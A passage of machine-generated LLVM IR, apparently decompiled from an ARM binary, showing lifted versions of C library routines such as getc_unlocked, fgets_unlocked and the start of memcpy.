  uselistorder i32 %v1_17068.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1704c, { 1, 0 }
  uselistorder i32 %v0_16ff0, { 1, 0, 2 }
  uselistorder i32 %v1_16fd4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16fc4, { 1, 0 }
  uselistorder i32 %v0_16f88, { 1, 0, 2 }
  uselistorder i32 %v1_16f6c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16f54, { 1, 0 }
  uselistorder i32 %v0_16f1c, { 1, 0, 2 }
  uselistorder i32 %v1_16f00.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16ef0, { 1, 0 }
  uselistorder i32 %v0_16eac, { 1, 0, 2 }
  uselistorder i32 %v1_16e90.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16e68, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 52, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 50, 19, 20, 21, 22, 23, 24, 26, 25, 51, 27, 28, 29, 30, 32, 31, 53, 33, 34, 35, 36, 38, 37, 54, 39, 40, 41, 42, 44, 43, 55, 45, 46, 49, 47, 48 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 16, 4, 5, 7, 6, 1, 8, 9, 10, 11, 13, 12, 0, 14, 15, 2, 17, 18, 19, 33, 34, 20, 21, 22, 35, 36, 23, 24, 25, 26, 37, 38, 27, 28, 29, 39, 40, 30, 31, 32 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 31, 26, 27, 28, 29, 30 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17164, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_1713c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17124, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_170a4, { 1, 0 }
  uselistorder label %dec_label_pc_17098, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_17088, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17070, { 1, 0 }
  uselistorder label %dec_label_pc_1702c, { 1, 0 }
  uselistorder label %dec_label_pc_1701cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_16ff4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16fdc, { 1, 0 }
  uselistorder label %dec_label_pc_16f9c, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_16f8c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16f74, { 1, 0 }
  uselistorder label %dec_label_pc_16f48, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16f20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16f08, { 1, 0 }
  uselistorder label %dec_label_pc_16ec0, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_16eb0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16e98, { 1, 0 }
  uselistorder label %dec_label_pc_16e64, { 1, 0 }
}

define i32 @function_171c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_171c0:
  %v0_171c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_171c0, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_171c0
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_171c0, %bb
  %v10_171d0 = phi i32 [ %arg1, %dec_label_pc_171c0 ], [ 0, %bb ]
  ret i32 %v10_171d0

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_171d4 = load i32, i32* @r4, align 4
  store i32 %v3_171d4, i32* %stack_var_-12, align 4
  %v6_171d4 = load i32, i32* @r5, align 4
  %v9_171d4 = load i32, i32* @lr, align 4
  %v0_171d8 = load i32, i32* @r0, align 4
  %v1_171d8 = add i32 %v0_171d8, 16
  %v2_171d8 = inttoptr i32 %v1_171d8 to i32*
  %v3_171d8 = load i32, i32* %v2_171d8, align 4
  store i32 %v3_171d8, i32* %r2.global-to-local, align 4
  %v1_171dc = add i32 %v0_171d8, 24
  %v2_171dc = inttoptr i32 %v1_171dc to i32*
  %v3_171dc = load i32, i32* %v2_171dc, align 4
  %v3_171e0 = icmp ult i32 %v3_171d8, %v3_171dc
  store i32 %v0_171d8, i32* @r4, align 4
  br i1 %v3_171e0, label %bb, label %dec_label_pc_17200

bb:                                               ; preds = %entry
  %v2_171ec = inttoptr i32 %v3_171d8 to i8*
  %v3_171ec = load i8, i8* %v2_171ec, align 1
  %v4_171ec = zext i8 %v3_171ec to i32
  store i32 %v4_171ec, i32* %r0.global-to-local, align 4
  %v6_171ec = add i32 %v3_171d8, 1
  store i32 %v6_171ec, i32* %r2.global-to-local, align 4
  store i32 %v6_171ec, i32* %v2_171d8, align 4
  br label %dec_label_pc_172ec

dec_label_pc_17200:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r5, align 4
  %v1_17200 = inttoptr i32 %v0_171d8 to i16*
  %v2_17200 = load i16, i16* %v1_17200, align 2
  %v3_17200 = zext i16 %v2_17200 to i32
  %v1_17204 = and i32 %v3_17200, 131
  %tmp25 = icmp ugt i32 %v1_17204, 128
  br i1 %tmp25, label %dec_label_pc_17220, label %dec_label_pc_17210

dec_label_pc_17210:                               ; preds = %dec_label_pc_17200
  store i32 128, i32* @r1, align 4
  %v0_17214 = call i32 @__stdio_trans2r_o()
  store i32 %v0_17214, i32* %r0.global-to-local, align 4
  %v2_17218 = icmp eq i32 %v0_17214, 0
  br i1 %v2_17218, label %dec_label_pc_17210.dec_label_pc_17220_crit_edge, label %dec_label_pc_172e8

dec_label_pc_17210.dec_label_pc_17220_crit_edge:  ; preds = %dec_label_pc_17210
  %v0_17220.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17220

dec_label_pc_17220:                               ; preds = %dec_label_pc_17210.dec_label_pc_17220_crit_edge, %dec_label_pc_17200
  %v2_17260 = phi i32 [ %v0_17220.pre, %dec_label_pc_17210.dec_label_pc_17220_crit_edge ], [ %v0_171d8, %dec_label_pc_17200 ]
  %v1_17220 = inttoptr i32 %v2_17260 to i16*
  %v2_17220 = load i16, i16* %v1_17220, align 2
  %v3_17220 = zext i16 %v2_17220 to i32
  store i32 %v3_17220, i32* %r2.global-to-local, align 4
  %v1_17224 = and i32 %v3_17220, 2
  %v2_17224 = icmp eq i32 %v1_17224, 0
  br i1 %v2_17224, label %dec_label_pc_17250, label %dec_label_pc_1722c

dec_label_pc_1722c:                               ; preds = %dec_label_pc_17220
  %tmp26 = urem i16 %v2_17220, 2
  %v1_1722c = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_1722c
  %v4_17230 = and i32 %tmp22, 4
  %v5_17230 = add i32 %v4_17230, %v2_17260
  %v1_17234 = add i32 %v5_17230, 36
  %v2_17234 = inttoptr i32 %v1_17234 to i8*
  %v3_17234 = load i8, i8* %v2_17234, align 1
  %v4_17234 = zext i8 %v3_17234 to i32
  %v1_17238 = add nsw i32 %v3_17220, -1
  store i32 %v1_17238, i32* %r2.global-to-local, align 4
  store i32 %v4_17234, i32* %r0.global-to-local, align 4
  %v2_17244 = add i32 %v2_17260, 40
  %v3_17244 = inttoptr i32 %v2_17244 to i32*
  store i32 0, i32* %v3_17244, align 4
  %v0_17248 = load i32, i32* %r2.global-to-local, align 4
  %v1_17248 = trunc i32 %v0_17248 to i16
  %v2_17248 = load i32, i32* @r4, align 4
  %v3_17248 = inttoptr i32 %v2_17248 to i16*
  store i16 %v1_17248, i16* %v3_17248, align 2
  br label %dec_label_pc_172ec

dec_label_pc_17250:                               ; preds = %dec_label_pc_17220
  %v1_17250 = add i32 %v2_17260, 16
  %v1_17254 = inttoptr i32 %v1_17250 to i32*
  %v2_17254 = load i32, i32* %v1_17254, align 4
  store i32 %v2_17254, i32* @r1, align 4
  %v3_17254 = add i32 %v2_17260, 20
  %v4_17254 = inttoptr i32 %v3_17254 to i32*
  %v5_17254 = load i32, i32* %v4_17254, align 4
  %v9_17258 = icmp eq i32 %v5_17254, %v2_17254
  br i1 %v9_17258, label %dec_label_pc_17268, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17250
  %v2_1725c = inttoptr i32 %v2_17254 to i8*
  %v3_1725c = load i8, i8* %v2_1725c, align 1
  %v4_1725c = zext i8 %v3_1725c to i32
  store i32 %v4_1725c, i32* %r0.global-to-local, align 4
  %v6_1725c = add i32 %v2_17254, 1
  store i32 %v6_1725c, i32* @r1, align 4
  store i32 %v6_1725c, i32* %v1_17254, align 4
  br label %dec_label_pc_172ec

dec_label_pc_17268:                               ; preds = %dec_label_pc_17250
  %v1_17268 = add i32 %v2_17260, 4
  %v2_17268 = inttoptr i32 %v1_17268 to i32*
  %v3_17268 = load i32, i32* %v2_17268, align 4
  %v7_1726c = icmp eq i32 %v3_17268, -2
  br i1 %v7_1726c, label %.thread7, label %dec_label_pc_17280

.thread7:                                         ; preds = %dec_label_pc_17268
  %v2_17270 = or i16 %v2_17220, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_17270, i16* %v1_17220, align 2
  br label %dec_label_pc_172ec

dec_label_pc_17280:                               ; preds = %dec_label_pc_17268
  %v1_17280 = and i32 %v3_17220, 768
  %v2_17280 = icmp eq i32 %v1_17280, 0
  br i1 %v2_17280, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_17280
  %v1_17288 = load i32, i32* @r5, align 4
  %v3_17288 = add i32 %v1_17288, 76
  %v4_17288 = inttoptr i32 %v3_17288 to i32*
  %v5_17288 = load i32, i32* %v4_17288, align 4
  store i32 %v5_17288, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_17280, %bb23
  store i32 94864, i32* @lr, align 4
  %v1_1728c = xor i1 %v2_17280, true
  call void @__pseudo_cond_branch(i1 %v1_1728c, i32 ptrtoint (i32* @global_var_16e28.618 to i32))
  %v0_17290 = load i32, i32* @r4, align 4
  %v1_17290 = add i32 %v0_17290, 8
  store i32 %v1_17290, i32* %r2.global-to-local, align 4
  %v1_17294 = inttoptr i32 %v1_17290 to i32*
  %v2_17294 = load i32, i32* %v1_17294, align 4
  store i32 %v2_17294, i32* %r2.global-to-local, align 4
  %v3_17294 = add i32 %v0_17290, 12
  %v4_17294 = inttoptr i32 %v3_17294 to i32*
  %v5_17294 = load i32, i32* %v4_17294, align 4
  %v9_17298 = icmp eq i32 %v5_17294, %v2_17294
  br i1 %v9_17298, label %dec_label_pc_172cc, label %dec_label_pc_172a0

dec_label_pc_172a0:                               ; preds = %.thread9
  %v2_172a0 = add i32 %v0_17290, 24
  %v3_172a0 = inttoptr i32 %v2_172a0 to i32*
  store i32 %v2_17294, i32* %v3_172a0, align 4
  %v0_172a4 = load i32, i32* @r4, align 4
  store i32 %v0_172a4, i32* %r0.global-to-local, align 4
  %v2_172a8 = call i32 @__stdio_rfill(i32 %v0_172a4)
  store i32 %v2_172a8, i32* %r0.global-to-local, align 4
  %v2_172ac = icmp eq i32 %v2_172a8, 0
  br i1 %v2_172ac, label %dec_label_pc_172e8, label %dec_label_pc_172b4

dec_label_pc_172b4:                               ; preds = %dec_label_pc_172a0
  %v0_172b4 = load i32, i32* @r4, align 4
  %v1_172b4 = add i32 %v0_172b4, 20
  %v2_172b4 = inttoptr i32 %v1_172b4 to i32*
  %v3_172b4 = load i32, i32* %v2_172b4, align 4
  %v2_172b8 = add i32 %v0_172b4, 24
  %v3_172b8 = inttoptr i32 %v2_172b8 to i32*
  store i32 %v3_172b4, i32* %v3_172b8, align 4
  %v0_172bc = load i32, i32* @r4, align 4
  %v1_172bc = add i32 %v0_172bc, 16
  %v2_172bc = inttoptr i32 %v1_172bc to i32*
  %v3_172bc = load i32, i32* %v2_172bc, align 4
  %v1_172c0 = inttoptr i32 %v3_172bc to i8*
  %v2_172c0 = load i8, i8* %v1_172c0, align 1
  %v3_172c0 = zext i8 %v2_172c0 to i32
  store i32 %v3_172c0, i32* %r0.global-to-local, align 4
  %v5_172c0 = add i32 %v3_172bc, 1
  store i32 %v5_172c0, i32* %v2_172bc, align 4
  br label %dec_label_pc_172ec

dec_label_pc_172cc:                               ; preds = %.thread9
  %v1_172cc = inttoptr i32 %v0_17290 to i16*
  store i32 %v0_17290, i32* %r0.global-to-local, align 4
  %v2_172d0 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_172d0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_172d8 = call i32 @__stdio_READ(i16* %v1_172cc, i32 %v2_172d0, i32 1)
  store i32 %v5_172d8, i32* %r0.global-to-local, align 4
  %v2_172dc = icmp eq i32 %v5_172d8, 0
  br i1 %v2_172dc, label %dec_label_pc_172e8, label %bb24

bb24:                                             ; preds = %dec_label_pc_172cc
  %v4_172e0 = load i8, i8* %stack_var_-17, align 1
  %v5_172e0 = sext i8 %v4_172e0 to i32
  store i32 %v5_172e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_172ec

dec_label_pc_172e8:                               ; preds = %dec_label_pc_172cc, %dec_label_pc_17210, %dec_label_pc_172a0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_172ec

dec_label_pc_172ec:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_172b4, %dec_label_pc_1722c, %dec_label_pc_172e8
  %v2_172f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_172f0, i32* @r4, align 4
  store i32 %v6_171d4, i32* @r5, align 4
  store i32 %v9_171d4, i32* @lr, align 4
  %v1_172f4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_172f4

; uselistorder directives
  uselistorder i32 %v2_17254, { 1, 0, 2, 3 }
  uselistorder i32 %v2_17260, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_171d8, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_172ec, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_172e8, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_17300 = load i32, i32* @r6, align 4
  %v12_17300 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17304 = icmp eq i32 %arg2, 0
  store i1 %v2_17304, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1738c, label %dec_label_pc_17374.preheader

dec_label_pc_17374.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_173742 = add i32 %arg2, -1
  store i32 %v1_173742, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_173748 = icmp eq i32 %arg2, 1
  store i1 %v7_173748, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_173748, label %dec_label_pc_1737c, label %dec_label_pc_17320

dec_label_pc_17320:                               ; preds = %dec_label_pc_17374.preheader, %dec_label_pc_17374.backedge.dec_label_pc_17320_crit_edge
  %v0_17344 = phi i32 [ %v0_17320.pre, %dec_label_pc_17374.backedge.dec_label_pc_17320_crit_edge ], [ %arg3, %dec_label_pc_17374.preheader ]
  %v1_17320 = add i32 %v0_17344, 16
  %v2_17320 = inttoptr i32 %v1_17320 to i32*
  %v3_17320 = load i32, i32* %v2_17320, align 4
  store i32 %v3_17320, i32* %r2.global-to-local, align 4
  %v1_17324 = add i32 %v0_17344, 24
  %v2_17324 = inttoptr i32 %v1_17324 to i32*
  %v3_17324 = load i32, i32* %v2_17324, align 4
  store i32 %v3_17324, i32* %r3.global-to-local, align 4
  %v3_17328 = icmp uge i32 %v3_17320, %v3_17324
  store i1 %v3_17328, i1* %cpsr_c.global-to-local, align 1
  %v9_17328 = icmp eq i32 %v3_17320, %v3_17324
  store i1 %v9_17328, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17328, label %dec_label_pc_17344, label %dec_label_pc_17330

dec_label_pc_17330:                               ; preds = %dec_label_pc_17320
  %v1_17330 = inttoptr i32 %v3_17320 to i8*
  %v2_17330 = load i8, i8* %v1_17330, align 1
  %v3_17330 = zext i8 %v2_17330 to i32
  store i32 %v3_17330, i32* %r3.global-to-local, align 4
  %v5_17330 = add i32 %v3_17320, 1
  store i32 %v5_17330, i32* %r2.global-to-local, align 4
  %v2_17334 = load i32, i32* @r5, align 4
  %v3_17334 = inttoptr i32 %v2_17334 to i8*
  store i8 %v2_17330, i8* %v3_17334, align 1
  %v4_17334 = load i32, i32* @r5, align 4
  %v5_17334 = add i32 %v4_17334, 1
  store i32 %v5_17334, i32* @r5, align 4
  %v0_17338 = load i32, i32* %r3.global-to-local, align 4
  %v2_17338 = icmp ugt i32 %v0_17338, 9
  store i1 %v2_17338, i1* %cpsr_c.global-to-local, align 1
  %v7_17338 = icmp eq i32 %v0_17338, 10
  store i1 %v7_17338, i1* %cpsr_z.global-to-local, align 1
  %v0_1733c = load i32, i32* %r2.global-to-local, align 4
  %v1_1733c = load i32, i32* @r4, align 4
  %v2_1733c = add i32 %v1_1733c, 16
  %v3_1733c = inttoptr i32 %v2_1733c to i32*
  store i32 %v0_1733c, i32* %v3_1733c, align 4
  br i1 %v7_17338, label %dec_label_pc_1737c, label %dec_label_pc_17374.backedge

dec_label_pc_17344:                               ; preds = %dec_label_pc_17320
  %v1_17344 = inttoptr i32 %v0_17344 to i16*
  %v3_17348 = call i32 @getc_unlocked(i16* %v1_17344)
  %v3_1734c = icmp eq i32 %v3_17348, -1
  store i1 %v3_1734c, i1* %cpsr_c.global-to-local, align 1
  %v8_1734c = icmp eq i32 %v3_17348, -1
  store i1 %v8_1734c, i1* %cpsr_z.global-to-local, align 1
  %v1_17350 = urem i32 %v3_17348, 256
  store i32 %v1_17350, i32* %r3.global-to-local, align 4
  br i1 %v3_1734c, label %dec_label_pc_17358, label %dec_label_pc_17370

dec_label_pc_17358:                               ; preds = %dec_label_pc_17344
  %v0_17358 = load i32, i32* @r4, align 4
  %v1_17358 = inttoptr i32 %v0_17358 to i16*
  %v2_17358 = load i16, i16* %v1_17358, align 2
  %v3_17358 = zext i16 %v2_17358 to i32
  store i32 %v3_17358, i32* %r3.global-to-local, align 4
  %v1_1735c = and i32 %v3_17358, 8
  %v2_1735c = icmp eq i32 %v1_1735c, 0
  store i1 %v2_1735c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1735c, label %dec_label_pc_1737c, label %dec_label_pc_1738c

dec_label_pc_17370:                               ; preds = %dec_label_pc_17344
  %v1_17368 = trunc i32 %v3_17348 to i8
  %v2_17368 = load i32, i32* @r5, align 4
  %v3_17368 = inttoptr i32 %v2_17368 to i8*
  store i8 %v1_17368, i8* %v3_17368, align 1
  %v4_17368 = load i32, i32* @r5, align 4
  %v5_17368 = add i32 %v4_17368, 1
  store i32 %v5_17368, i32* @r5, align 4
  %v0_1736c = load i32, i32* %r3.global-to-local, align 4
  %v2_1736c = icmp ugt i32 %v0_1736c, 9
  store i1 %v2_1736c, i1* %cpsr_c.global-to-local, align 1
  %v7_1736c = icmp eq i32 %v0_1736c, 10
  store i1 %v7_1736c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1736c, label %dec_label_pc_1737c, label %dec_label_pc_17374.backedge

dec_label_pc_17374.backedge:                      ; preds = %dec_label_pc_17370, %dec_label_pc_17330
  %v0_17374 = load i32, i32* @r6, align 4
  %v1_17374 = add i32 %v0_17374, -1
  store i32 %v1_17374, i32* @r6, align 4
  %v2_17374 = icmp ne i32 %v0_17374, 0
  store i1 %v2_17374, i1* %cpsr_c.global-to-local, align 1
  %v7_17374 = icmp eq i32 %v0_17374, 1
  store i1 %v7_17374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17374, label %dec_label_pc_1737c, label %dec_label_pc_17374.backedge.dec_label_pc_17320_crit_edge

dec_label_pc_17374.backedge.dec_label_pc_17320_crit_edge: ; preds = %dec_label_pc_17374.backedge
  %v0_17320.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17320

dec_label_pc_1737c:                               ; preds = %dec_label_pc_17370, %dec_label_pc_17374.backedge, %dec_label_pc_17330, %dec_label_pc_17374.preheader, %dec_label_pc_17358
  %v0_1737c = load i32, i32* @r5, align 4
  %v1_1737c = load i32, i32* @r7, align 4
  %v3_1737c = icmp uge i32 %v0_1737c, %v1_1737c
  store i1 %v3_1737c, i1* %cpsr_c.global-to-local, align 1
  %v9_1737c = icmp eq i32 %v0_1737c, %v1_1737c
  store i1 %v9_1737c, i1* %cpsr_z.global-to-local, align 1
  %v2_17380 = xor i1 %v9_1737c, true
  %v3_17380 = and i1 %v3_1737c, %v2_17380
  br i1 %v3_17380, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1737c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_17384 = inttoptr i32 %v0_1737c to i8*
  store i8 0, i8* %v7_17384, align 1
  %v0_17388.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_17388.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1737c, %bb
  %v1_17388 = phi i1 [ %v1_17388.pre, %bb ], [ %v9_1737c, %dec_label_pc_1737c ]
  %v0_17388 = phi i1 [ %v0_17388.pre, %bb ], [ %v3_1737c, %dec_label_pc_1737c ]
  %v2_17388 = xor i1 %v1_17388, true
  %v3_17388 = and i1 %v0_17388, %v2_17388
  br i1 %v3_17388, label %.dec_label_pc_17390_crit_edge, label %dec_label_pc_1738c

.dec_label_pc_17390_crit_edge:                    ; preds = %.thread14
  %v0_17390.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17390

dec_label_pc_1738c:                               ; preds = %entry, %dec_label_pc_17358, %.thread14
  br label %dec_label_pc_17390

dec_label_pc_17390:                               ; preds = %.dec_label_pc_17390_crit_edge, %dec_label_pc_1738c
  %v0_17390 = phi i32 [ %v0_17390.pre, %.dec_label_pc_17390_crit_edge ], [ 0, %dec_label_pc_1738c ]
  store i32 %v9_17300, i32* @r6, align 4
  store i32 %v12_17300, i32* @r7, align 4
  ret i32 %v0_17390

; uselistorder directives
  uselistorder i1 %v9_1737c, { 1, 0, 2 }
  uselistorder i32 %v1_1737c, { 1, 0 }
  uselistorder i32 %v0_1737c, { 0, 2, 1 }
  uselistorder i32 %v0_17374, { 2, 0, 1 }
  uselistorder i32 %v0_1736c, { 1, 0 }
  uselistorder i32 %v3_17348, { 2, 1, 0, 3 }
  uselistorder i32 %v0_17338, { 1, 0 }
  uselistorder i32 %v3_17320, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_17344, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_17390, { 1, 0 }
  uselistorder label %dec_label_pc_1738c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1737c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_17320, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_173a0 = load i32, i32* @r1, align 4
  %v1_173a0 = load i32, i32* @r0, align 4
  %v2_173a0 = sub i32 %v0_173a0, %v1_173a0
  %v3_173a0 = icmp ult i32 %v0_173a0, %v1_173a0
  %v4_173a0 = xor i32 %v1_173a0, %v0_173a0
  %v5_173a0 = xor i32 %v2_173a0, %v0_173a0
  %v6_173a0 = and i32 %v5_173a0, %v4_173a0
  %v7_173a0 = icmp slt i32 %v6_173a0, 0
  store i1 %v7_173a0, i1* %cpsr_v.global-to-local, align 1
  %v8_173a0 = icmp slt i32 %v2_173a0, 0
  store i1 %v8_173a0, i1* %cpsr_n.global-to-local, align 1
  %v9_173a0 = icmp eq i32 %v0_173a0, %v1_173a0
  store i1 %v9_173a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_173a0, label %dec_label_pc_175f4, label %dec_label_pc_173a8

dec_label_pc_173a8:                               ; preds = %entry
  br i1 %v9_173a0, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_173a8
  %merge = phi i32 [ %v0_173a0, %dec_label_pc_173a8 ], [ %v2_17688, %bb150 ], [ %v11_176a4, %bb153 ], [ %v7_176a4, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_173a8
  %v5_173ac = inttoptr i32 %v1_173a0 to i8*
  store i8* %v5_173ac, i8** %stack_var_-8, align 4
  %v8_173ac = load i32, i32* @lr, align 4
  %v0_173b0 = load i32, i32* @r2, align 4
  %v2_173b0 = add i32 %v0_173b0, -4
  store i32 %v2_173b0, i32* %r2.global-to-local, align 4
  %v4_173b0 = sub i32 3, %v0_173b0
  %v5_173b0 = and i32 %v4_173b0, %v0_173b0
  %v6_173b0 = icmp slt i32 %v5_173b0, 0
  store i1 %v6_173b0, i1* %cpsr_v.global-to-local, align 1
  %v7_173b0 = icmp slt i32 %v2_173b0, 0
  store i1 %v7_173b0, i1* %cpsr_n.global-to-local, align 1
  %v8_173b0 = icmp eq i32 %v0_173b0, 4
  store i1 %v8_173b0, i1* %cpsr_z.global-to-local, align 1
  %v5_173b4 = icmp slt i32 %v0_173b0, 4
  br i1 %v5_173b4, label %bb140, label %dec_label_pc_173b8

dec_label_pc_173b8:                               ; preds = %bb
  %v1_173b8 = urem i32 %v1_173a0, 4
  store i32 %v1_173b8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_173b8 = icmp eq i32 %v1_173b8, 0
  store i1 %v2_173b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_173b8, label %dec_label_pc_173c0, label %dec_label_pc_1746c

dec_label_pc_173c0:                               ; preds = %dec_label_pc_173b8
  %v1_173c0 = urem i32 %v0_173a0, 4
  store i32 %v1_173c0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_173c0 = icmp eq i32 %v1_173c0, 0
  store i1 %v2_173c0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_173a0 to i2
  br i1 %v2_173c0, label %dec_label_pc_173c8, label %dec_label_pc_1749c

dec_label_pc_173c8:                               ; preds = %dec_label_pc_173c0, %dec_label_pc_17494
